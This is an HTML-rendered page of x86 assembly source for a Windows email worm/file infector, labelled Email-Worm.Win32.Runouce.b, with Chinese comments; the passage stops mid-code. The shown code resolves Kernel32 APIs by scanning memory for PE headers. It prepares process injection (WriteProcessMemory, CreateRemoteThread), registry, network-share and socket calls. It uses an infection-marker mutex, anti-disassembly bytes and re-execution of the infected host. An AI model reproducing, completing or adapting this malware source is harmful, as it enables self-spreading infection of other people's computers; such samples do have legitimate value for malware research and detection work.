<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Runouce.b - src200.b8f.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">wap32.inc</span><span class="sc0">

</span><span class="sc5">ApiAddressList</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
  </span><span class="sc1">;Kernel32.DLL</span><span class="sc0">
  </span><span class="sc5">KnlLoadLibraryA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlCreateMutexA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlGetLastError</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlGetCommandLineA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlWinExec</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   
  </span><span class="sc5">KnlGetDriveTypeA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlSetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlFindFirstFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlFindNextFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
  </span><span class="sc5">KnlFindClose</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlSetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlSetFileTime</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
  </span><span class="sc5">KnlLOpen</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlLRead</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlLWrite</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlLSeek</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlLClose</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  
  </span><span class="sc5">KnlSleep</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlRegisterServiceProc</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlGetCurrentProcessId</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlOpenProcess</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlWriteProcessMemory</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlCreateRemoteThread</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlCreateKernelThread</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlCloseHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlWaitForSingleObject</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlVirtualAllocEx</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlGetSystemDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlLCreat</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlCreateThread</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlTerminateThread</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlWideCharToMultiByte</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlGetComputerNameA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">KnlGetSystemTime</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc1">;User32.DLL</span><span class="sc0">
  </span><span class="sc5">UserGetWinThreadProcId</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">UserFindWindowA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">UserMessageBoxA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">UserGetWindow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">UserSendMessageA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">UserwsprintfA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc1">;AdvApi32.DLL</span><span class="sc0">
  </span><span class="sc5">AdvRegOpenKeyA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">AdvRegSetValueExA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">AdvRegQueryValueExA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">AdvRegNotifyChange</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc1">;Mpr.DLL</span><span class="sc0">
  </span><span class="sc5">MprWNetOpenEnumA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">MprWNetEnumResourceA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">MprWNetCloseEnum</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc1">;WSock32.DLL</span><span class="sc0">
  </span><span class="sc5">WsWSAStartup</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">WsWSACleanup</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">Wssend</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">Wshtons</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">Wsgethostbyname</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">Wsconnect</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">Wssocket</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">Wsclosesocket</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">Wsrecv</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc1">;VirusData        </span><span class="sc0">
  </span><span class="sc5">DataKnlMzHeader</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
  </span><span class="sc5">DataVirusSize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">DataRemoteThread</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  

</span><span class="sc5">ApiAddressList</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">MAX_BUFF_SIZE</span><span class="sc4">=</span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">VirusSize</span><span class="sc4">=</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusEnd</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc2">.586p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirusEnd</span><span class="sc0">
</span><span class="sc5">NeedDecode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushRunError</span><span class="sc0">    </span><span class="sc1">;得到意外继续执行地址</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc5">PushXXXCode</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">  </span><span class="sc1">;JmpOldApp</span><span class="sc0">
    </span><span class="sc5">OldEntryRVA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">PushRunError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetSehFrame</span><span class="sc0">
</span><span class="sc5">FindKernel32</span><span class="sc4">:</span><span class="sc0">       
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0fffff000h</span><span class="sc0">  </span><span class="sc1">;得到Kernel.PELoader代码位置(不精确)</span><span class="sc0">
</span><span class="sc5">LoopFindKernel32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">  </span><span class="sc1">;搜索EXE文件头</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">LoopFindKernel32</span><span class="sc0">
</span><span class="sc5">GetPeHeader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">esi.PEHeaderOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">edi.fhExportsRVA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;得到输出函数表</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ebp.etExportNameList</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;得到输出函数名表</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;函数序号计数</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;暂存Kernel32模块句柄</span><span class="sc0">
</span><span class="sc5">LoopFindApiStr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;增加函数计数</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;得到一个Api函数名字符串</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushStrGetProcAddress</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushStrGetProcAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;得到Api名字字符串</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">       </span><span class="sc1">;GetProcAddress串大小</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">  
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">LoopFindApiStr</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ebp.etExportOrdlList</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;取函数序号地址列表</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ebp.etExportAddrList</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;得到Kernel32函数地址列表</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;计算GetProcAddress函数地址</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ApiAddressList</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">;在堆栈中存放API的地址</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.DataKnlMzHeader</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr</span><span class="sc0">   
</span><span class="sc5">LoopRelocKnlApi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;定位Kernel32.dll Api</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LoopRelocKnlApi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.KnlLoadLibraryA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushUser32Str</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'USER32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushUser32Str</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushUser32ApiStr</span><span class="sc0">
</span><span class="sc5">LoopRelocUser32Api</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;定位User32.dll Api</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LoopRelocUser32Api</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.KnlLoadLibraryA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushAdvApi32Str</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'ADVAPI32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushAdvApi32Str</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushAdvApiStr</span><span class="sc0">
</span><span class="sc5">LoopRelocAdvApi32Api</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;定位ADVAPI32.dll Api</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LoopRelocAdvApi32Api</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.KnlLoadLibraryA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushMprStr</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MPR.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushMprStr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushMprApiStr</span><span class="sc0">
</span><span class="sc5">LoopRelocMprApi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;定位MPR.dll Api</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LoopRelocMprApi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.KnlLoadLibraryA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsStr</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WSOCK32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushWsStr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsApiStr</span><span class="sc0">
</span><span class="sc5">LoopRelocWsApi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;定位MPR.dll Api</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LoopRelocWsApi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">;函数调用列表指针,以后固定不变</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushMutexName</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'ChineseHacker-2'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushMutexName</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlCreateMutexA</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlGetLastError</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;检查病毒是否已经运行</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ExecOldProgram</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc1">;      ;人工引发异常执行原程序,JmpOldApp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">ExecOldProgram</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;加载自己，运行老程序</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlGetCommandLineA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlWinExec</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushNextRunErrorProc</span><span class="sc1">;保护注册表与创建远程线程</span><span class="sc0">
